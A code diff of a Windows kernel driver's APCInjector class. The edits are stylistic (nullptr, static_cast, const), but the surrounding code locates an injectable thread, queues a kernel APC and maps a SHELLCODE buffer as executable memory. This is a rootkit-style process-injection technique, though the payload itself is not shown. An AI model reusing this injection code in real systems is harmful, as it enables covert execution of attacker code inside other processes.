@@ -8,7 +8,7 @@ APCInjector::APCInjector(Process& process)
 
 NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
     auto status = STATUS_SUCCESS;
-    const auto isWow64 = PsGetProcessWow64Process(m_process.get()) != NULL;
+    const auto isWow64 = PsGetProcessWow64Process(m_process.get()) != nullptr;
     ULONG bytesToAllocate = 0;
 
     status = ZwQuerySystemInformation(SystemProcessInformation, nullptr, NULL, &bytesToAllocate);
@@ -17,7 +17,7 @@ NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
     }
 
     const auto processInformation = UniquePtr<SYSTEM_PROCESS_INFO, PagedPool, POOL_TAG>(
-        reinterpret_cast<PSYSTEM_PROCESS_INFO>(ExAllocatePoolWithTag(PagedPool, bytesToAllocate, POOL_TAG)));
+        static_cast<PSYSTEM_PROCESS_INFO>(ExAllocatePoolWithTag(PagedPool, bytesToAllocate, POOL_TAG)));
 
     status = ZwQuerySystemInformation(SystemProcessInformation, processInformation.get(), bytesToAllocate, NULL);
     if (!NT_SUCCESS(status)) {
@@ -49,7 +49,7 @@ NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
 
 NTSTATUS APCInjector::queueKernelApc() {
     ULONG threadId = 0;
-    auto status = findInjectableThread(&threadId);
+    const auto status = findInjectableThread(&threadId);
 
     if (!NT_SUCCESS(status)) {
         return status;
@@ -77,7 +77,7 @@ void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
 		PAGE_EXECUTE_READ
 	);
 
-	auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(SHELLCODE), false, false, nullptr);
+	const auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(SHELLCODE), false, false, nullptr);
 
 	if (!mdl) {
 		KdPrint(("[-] Could not allocate a MDL.\n"));
@@ -86,7 +86,7 @@ void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
 
 	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
 
-	auto mappedAddress = MmMapLockedPagesSpecifyCache(
+	const auto mappedAddress = MmMapLockedPagesSpecifyCache(
 		mdl,
 		KernelMode,
 		MmNonCached,
